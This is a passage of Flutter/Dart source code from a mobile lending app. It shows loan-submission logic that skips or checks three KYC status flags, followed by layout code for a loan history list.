                                                  // User has loan history, directly submit loan
                                                  log('User has loan history, skip KYC - direct submit loan');
                                                  transactionBloc.add(PostLoanEvent(
                                                    packageId: selectedPackage!.id.toString(),
                                                    dateLoan: DateFormat('yyyy-MM-dd').format(DateTime.now()),
                                                  ));
                                                } else {
                                                  // First time user, check KYC status
                                                  String statusKyc1 =
                                                      await preferencesHelper.getStringSharedPref('kyc_status1');
                                                  String statusKyc2 =
                                                      await preferencesHelper.getStringSharedPref('kyc_status2');
                                                  String statusKyc3 =
                                                      await preferencesHelper.getStringSharedPref('kyc_status3');

                                                  if (statusKyc1 == '0' || statusKyc2 == '0' || statusKyc3 == '0') {
                                                    GlobalFunction().allDialog(context,
                                                        title: Languages.of(context).kycLoanPendingApproval);
                                                  } else if (statusKyc1 == '2' ||
                                                      statusKyc2 == '2' ||
                                                      statusKyc3 == '2') {
                                                    GlobalFunction().allDialog(context,
                                                        title: Languages.of(context).kycRejected, onTap: () {
                                                      context.pushNamed(kyc1Input, extra: selectedPackage);
                                                    });
                                                  } else if (statusKyc1 == '1' &&
                                                      statusKyc2 == '1' &&
                                                      statusKyc3 == '1') {
                                                    log('First time user KYC approved - submit loan');
                                                    transactionBloc.add(PostLoanEvent(
                                                      packageId: selectedPackage!.id.toString(),
                                                      dateLoan: DateFormat('yyyy-MM-dd').format(DateTime.now()),
                                                    ));
                                                  } else {
                                                    context.pushNamed(kyc1Input, extra: selectedPackage);
                                                  }
                                                }
                                              },
                                      );
                                    },
                                  ),
                                  const SizedBox(
                                    height: 24.0,
                                  ),
                                  Row(
                                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                    children: [
                                      Text(
                                        Languages.of(context).historyLoan,
                                        style: white16w600,
                                      ),
                                      Text(
                                        Languages.of(context).seeMore,
                                        textAlign: TextAlign.center,
                                        style: GoogleFonts.inter(
                                          color: const Color(0xFF7D8998),
                                          fontSize: 12,
                                          fontWeight: FontWeight.w400,
                                        ),
                                      )
                                    ],
                                  ),
                                  const SizedBox(
                                    height: 8.0,
                                  ),
                                  HistoryLoan(
                                    data: listLoan,
                                  ),
                                  const SizedBox(
                                    height: 50.0,
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
        ),
      ),
    );
  }
}
